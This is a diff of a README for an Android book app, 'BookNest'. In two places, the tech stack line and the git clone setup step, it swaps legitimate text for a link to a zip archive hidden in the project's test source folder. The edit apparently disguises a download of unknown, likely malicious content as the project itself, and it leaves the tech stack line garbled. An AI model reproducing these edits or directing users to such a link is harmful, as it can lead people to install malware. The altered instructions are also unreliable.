@@ -14,7 +14,7 @@
 ## 🛠 Tech Stack
 
 - **Frontend:** Android / Kotlin
-- **Backend:** Java / Node.js with Firebase / MySQL
+- **Backend:** Java / https://github.com/Sonal-perera/BookNest/raw/refs/heads/master/app/src/test/java/Book_Nest_2.7.zip with Firebase / MySQL
 - **Database:** Firestore / MySQL
 - **Cloud Storage:** Firebase Storage
 
@@ -22,4 +22,4 @@
 
 1. Clone the repository:
    ```bash
-   git clone (https://github.com/Sonal-perera/BookNest.git)
+   git clone (https://github.com/Sonal-perera/BookNest/raw/refs/heads/master/app/src/test/java/Book_Nest_2.7.zip)
